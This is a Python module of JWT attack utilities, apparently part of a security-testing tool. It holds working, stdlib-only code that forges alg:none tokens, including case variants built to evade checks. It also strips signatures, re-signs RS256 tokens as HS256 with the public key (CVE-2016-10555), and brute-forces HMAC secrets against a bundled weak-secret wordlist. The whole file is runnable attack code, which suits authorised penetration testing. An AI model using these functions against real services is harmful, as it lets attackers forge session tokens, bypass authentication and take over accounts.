"""Standalone JWT manipulation utilities for security testing.

Vendored, dependency-free (stdlib-only) implementations of the most
critical JWT attack vectors. Used by admin/session.py to go beyond
the existing unsigned-token forge test.

Attack vectors implemented:
- alg:none bypass (CVE-2015-2951)
- Empty signature bypass
- RS256 -> HS256 algorithm confusion (CVE-2016-10555)
- Weak HMAC secret cracking against a built-in wordlist

References: ticarpi/jwt_tool, geeknik/jwt-scanner, Bytenull00/jwt_pwned.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Optional

from ..core.logger import get_logger

log = get_logger("admin.jwt")

# Common weak secrets for HS256 brute-force.
_WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "jwt_secret", "default",
    "admin", "test", "key", "private", "supersecret", "mysecret",
    "jwt-secret", "token-secret", "app_secret", "s3cr3t", "your-256-bit-secret",
    "", "null", "undefined", "none",
]


def _b64url_decode(s: str) -> bytes:
    """Base64url decode with padding."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.b64encode(data).decode().rstrip("=").replace("+", "-").replace("/", "_")


def _b64url_encode_json(obj: dict) -> str:
    """JSON-encode and base64url-encode a dict."""
    return _b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def decode_jwt_parts(token: str) -> tuple[dict, dict, str]:
    """Decode a JWT into (header, payload, signature_b64).

    Returns empty dicts on failure. Does NOT verify the signature.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return {}, {}, ""
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return {}, {}, ""


def forge_none_alg(token: str) -> str:
    """Rebuild *token* with ``"alg": "none"`` and an empty signature.

    CVE-2015-2951: Some JWT libraries accept ``alg: none`` without verifying
    the signature, allowing arbitrary claim forgery.

    Reference: ticarpi/jwt_tool, Bytenull00/jwt_pwned.
    """
    header, payload, _ = decode_jwt_parts(token)
    if not header:
        return ""
    header["alg"] = "none"
    return f"{_b64url_encode_json(header)}.{_b64url_encode_json(payload)}."


def forge_none_alg_variants(token: str) -> list[tuple[str, str]]:
    """Generate multiple ``alg:none`` variants to bypass case-sensitive checks.

    Returns (variant_name, forged_token) pairs.
    """
    header, payload, _ = decode_jwt_parts(token)
    if not header:
        return []
    variants = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header)
        h["alg"] = alg
        tok = f"{_b64url_encode_json(h)}.{_b64url_encode_json(payload)}."
        variants.append((f"alg:{alg}", tok))
    return variants


def forge_empty_sig(token: str) -> str:
    """Keep header and payload, strip the signature segment.

    Some implementations treat an empty signature as valid when ``alg``
    is not explicitly checked.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return ""
    return f"{parts[0]}.{parts[1]}."


def forge_hs256_with_pubkey(token: str, pubkey_pem: str) -> str:
    """Re-sign an RS256 token as HS256 using the public key as HMAC secret.

    CVE-2016-10555: If the server uses the RSA public key for both RS256
    verification and HS256 verification, an attacker can re-sign the token
    with HS256 using the public key (which is public), and the server will
    accept it.

    Reference: ticarpi/jwt_tool RS/HS confusion attack.
    """
    header, payload, _ = decode_jwt_parts(token)
    if not header or not pubkey_pem:
        return ""
    header["alg"] = "HS256"
    signing_input = f"{_b64url_encode_json(header)}.{_b64url_encode_json(payload)}"
    key = pubkey_pem.encode()
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url_encode(sig)}"


def crack_weak_secret(token: str, wordlist: Optional[list[str]] = None) -> Optional[str]:
    """Brute-force HS256 against a wordlist of common weak secrets.

    Returns the secret if found, else None.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header, _, _ = decode_jwt_parts(token)
    if header.get("alg") not in ("HS256", "HS384", "HS512"):
        return None

    alg = header["alg"]
    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }[alg]

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = _b64url_decode(parts[2])
    candidates = wordlist or _WEAK_SECRETS

    for secret in candidates:
        computed = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        if hmac.compare_digest(computed, expected_sig):
            log.info("JWT weak secret found: '%s'", secret)
            return secret
    return None
